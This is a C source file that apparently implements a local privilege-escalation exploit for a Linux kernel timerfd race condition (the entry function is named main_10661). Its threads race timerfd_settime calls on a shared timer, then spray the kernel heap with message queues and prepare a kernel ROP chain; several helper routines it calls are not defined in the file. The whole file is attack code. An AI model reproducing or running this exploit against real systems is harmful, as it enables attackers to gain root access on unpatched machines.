#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <sys/timerfd.h>
#include <sys/time.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <pthread.h>
#define RACE_TIME 8000
#define NUM_THREADS 2

int fd;
int fd_dumb;

struct detect_profile{
    unsigned long* ptr;
    int profile_type;
};

void* list_add_thread(void* arg){

    int ret;

    struct itimerspec new_t ={
        .it_interval={
            .tv_sec=100,
            .tv_nsec=100
        },
        .it_value={
            .tv_sec=100,
            .tv_nsec=100
        }
    };

    int i=0;
    while(i<1){

        ret=timerfd_settime(fd,3,&new_t,NULL);

        if(ret<0){
            perror("timerfd settime failed !");
        }
        i++;
    }


    return NULL;
}

void* list_del_thread(void* arg){

    int ret;

    struct itimerspec new_t ={
        .it_interval={
            .tv_sec=100,
            .tv_nsec=100
        },
        .it_value={
            .tv_sec=100,
            .tv_nsec=100
        }
    };

    int i=0;
    while(i<1){
        ret=timerfd_settime(fd,1,&new_t,NULL);

        if(ret<0){
            perror("timerfd settime failed !");
        }
        i++;
    }
    return NULL;

}

int do_race(){
    int ret_add[NUM_THREADS];
    int i;
    int j;
    pthread_t th[NUM_THREADS]={0};
	memset(ret_add,0,8);

    i=0;
    while(i < RACE_TIME){

        fd=timerfd_create(CLOCK_REALTIME,0); 
        if(fd<0){
            perror("timerfd craete failed!");
            return -1;
        }
        for(j=0;j<NUM_THREADS;j++){
            ret_add[j]=pthread_create(&th[j],NULL,list_add_thread,(void*)2);
        }

        for( j=0;j<NUM_THREADS;j++){
            pthread_join(th[j],NULL);
        }

        close(fd);
        usleep(300000);
        msgsnd_spray();
        msgrcv_spray();
        loop();
        i++;
        *(unsigned long*)(userspace_base_to_map + 0)=0;
        *(unsigned long*)(userspace_base_to_map - 8)=0;
        *(unsigned long*)(krop_base_mapped + 0)=0;
        *(unsigned long*)(krop_base_mapped + 0x4000)=0;
        *(unsigned long*)(krop_base_mapped + 0x4000 - 8)=0;
    }

    return 0;
}

int main_10661()
{
    int ret;
    save_state();
    spray_buffer_init();
    prepare_krop();
    init_userspace_base();

    struct itimerspec new_t ={
        .it_interval={
            .tv_sec=100,
            .tv_nsec=100
        },
        .it_value={
            .tv_sec=100,
            .tv_nsec=100
        }
    };
    fd_dumb = timerfd_create(CLOCK_REALTIME,0);

    ret = timerfd_settime(fd_dumb,3,&new_t,NULL);
    if(ret < 0){
        perror("timerfd settime failed !");
    }

    ret=do_race();
    if(ret <0){
        puts("race failed!");
        goto error_end;
    }

    sleep(5);
error_end:
	return 0;
}
